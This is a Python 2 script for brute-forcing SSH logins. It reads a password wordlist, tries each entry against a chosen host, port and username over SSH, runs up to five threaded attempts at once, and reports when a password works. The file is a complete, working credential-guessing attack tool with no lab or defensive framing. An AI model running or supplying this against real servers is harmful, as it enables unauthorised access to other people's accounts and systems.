import optparse
import time
from pexpect import pxssh
from threading import *

max_connections = 5
connection_lock = BoundedSemaphore(value=max_connections)

found = False
fails = 0


def connect(host, port, user, password, release):
    global found
    global fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password, port=port)
        print '[+] Password Found: ' + password
        found = True
    except Exception, e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, port, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, port, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser('usage%prog -H <target host> -p <target port> -u <username> -F <password list>')
    parser.add_option('-H', dest='host', type='string', help='specify target host')
    parser.add_option('-p', dest='port', type='string', help='specify target port')
    parser.add_option('-u', dest='user', type='string', help='specify the user')
    parser.add_option('-F', dest='pass_file', type='string', help='specify password file')

    options, args = parser.parse_args()
    host = options.host
    port = options.port if options.port is not None else '22'
    user = options.user
    pass_file = options.pass_file

    if (host is None) or (user is None) or (pass_file is None):
        print parser.usage
        exit(0)

    fn = open(pass_file, 'r')

    for line in fn.readlines():
        if found:
            print '[+] Exiting: Password Found'
            exit(0)
        if fails > 5:
            print '[!] Exiting: Too Many Scoket Timeouts'
            exit(0)

        connection_lock.acquire()
        password = line.strip('\r').strip('\n')

        print '[-] Testing: ' + password
        t = Thread(target=connect, args=(host, port, user, password, True))
        t.start()


if __name__ == '__main__':
    main()
